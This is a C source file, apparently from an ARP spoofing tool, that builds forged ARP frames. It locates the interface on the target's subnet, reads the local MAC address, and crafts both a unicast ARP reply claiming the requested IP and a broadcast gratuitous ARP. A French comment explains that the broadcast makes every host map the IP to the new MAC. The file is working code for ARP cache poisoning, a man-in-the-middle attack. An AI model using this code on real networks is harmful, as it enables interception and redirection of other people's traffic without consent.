#include "main.h"


bool check_same_network(struct ifaddrs *interface, const char *ip)
{
    struct sockaddr_in *addr = (struct sockaddr_in *)interface->ifa_addr;
    u_int32_t net_ip = addr->sin_addr.s_addr;

    addr = (struct sockaddr_in *)interface->ifa_netmask;
    u_int32_t net_mask = addr->sin_addr.s_addr;

    u_int32_t ip_cible;
    inet_pton(AF_INET, ip, &ip_cible);
    if ((net_ip & net_mask) == (ip_cible & net_mask))
        return true;
    return false;
}

bool get_interface_name(char *ip_cible, char *interface_name, struct ifaddrs *all_interface, int verbose)
{
    struct ifaddrs *temp;

    temp = all_interface;
    while(temp != NULL)
    {
        if(temp->ifa_addr->sa_family == AF_INET && strcmp(temp->ifa_name, "lo") != 0 && check_same_network(temp, ip_cible))
        {
            struct sockaddr_in *addr = (struct sockaddr_in *)temp->ifa_addr;
            if (verbose == 1)
                printf("Interface found name: %s\t Adresse IP: %s\n", temp->ifa_name, inet_ntoa(addr->sin_addr));
            strcpy(interface_name, temp->ifa_name);
            return (true);
        }
        temp = temp->ifa_next;
    }
    if (temp == NULL)
        return (printf("No interface on same network for send arp spoofing at %s\n", ip_cible), false);//at ip machin
    return (true);
}

bool get_my_address_MAC(unsigned char *dest, char *ip, int verbose)
{
    struct ifaddrs *all_interface, *temp;
    char interface_name[15];

    if ((getifaddrs(&all_interface)) != 0)
        return(printf("getifaddrs error: %s\n", strerror(errno)), false);
    if (!(get_interface_name(ip, interface_name, all_interface, verbose)))
        return (freeifaddrs(all_interface), false);

    temp = all_interface;
    while(temp != NULL)
    {
        if (temp->ifa_addr->sa_family == AF_PACKET && strcmp(temp->ifa_name, interface_name) == 0)
        {
            struct sockaddr_ll *interface = (struct sockaddr_ll *)temp->ifa_addr;
            memcpy(dest, interface->sll_addr, ETH_ALEN);
            break;
        }
        temp = temp->ifa_next;
    }
    freeifaddrs(all_interface);
    return (true);
}

bool create_frame_unicast_request(struct arp_frame *send_frame, struct arp_frame *recv_frame, char *ip, int verbose)
{
    memcpy(send_frame->ether_dest_mac, recv_frame->ether_src_mac, ETH_ALEN);
    if (!(get_my_address_MAC(send_frame->ether_src_mac, ip, verbose)))
        return (false);
    send_frame->ether_type = htons(0x0806);
    send_frame->hardware_type = htons(0x0001);
    send_frame->ip_size = 0x04;
    send_frame->mac_size = 0x06;
    send_frame->op_code = htons(0x0002);
    send_frame->protocole_type = htons(0x0800);
    memcpy(send_frame->sender_ip, recv_frame->target_ip, 4);
    if (!(get_my_address_MAC(send_frame->sender_mac, ip, verbose)))
        return (false);
    memcpy(send_frame->target_ip, recv_frame->sender_ip, 4);
    memcpy(send_frame->target_mac, recv_frame->sender_mac, ETH_ALEN);
    return (true);
}

/*Pour faire un arp gratuit on met le op_code a 1 et dans la trame ethernet ainsi que dans la trame arp en destination pour l'adresse mac on met FF:FF:FF:FF:FF:FF ou
00:00:00:00:00:00 et pour l'adresse ip du destinataire on va mettre celui de la source. Ainsi toute les personnes qui ont dans leurs tables arp l'adresse IP auront
leurs table arp mise a jour avec la nouvelle adresse MAC*/

bool create_frame_gatuitous(struct arp_frame *send_frame, char *ip, int verbose)
{
    memset(send_frame->ether_dest_mac, 0xff, ETH_ALEN);
    if (!(get_my_address_MAC(send_frame->ether_src_mac, ip, verbose)))
        return (false);
    send_frame->ether_type = htons(0x0806);
    send_frame->hardware_type = htons(0x0001);
    send_frame->ip_size = 0x04;
    send_frame->mac_size = 0x06;
    send_frame->op_code = htons(0x0001);
    send_frame->protocole_type = htons(0x0800);
    inet_pton(AF_INET, ip, send_frame->sender_ip);
    if (!(get_my_address_MAC(send_frame->sender_mac, ip, verbose)))
        return (false);
    inet_pton(AF_INET, ip, send_frame->target_ip);
    memset(send_frame->target_mac, 0xff, ETH_ALEN);
    return (true);
}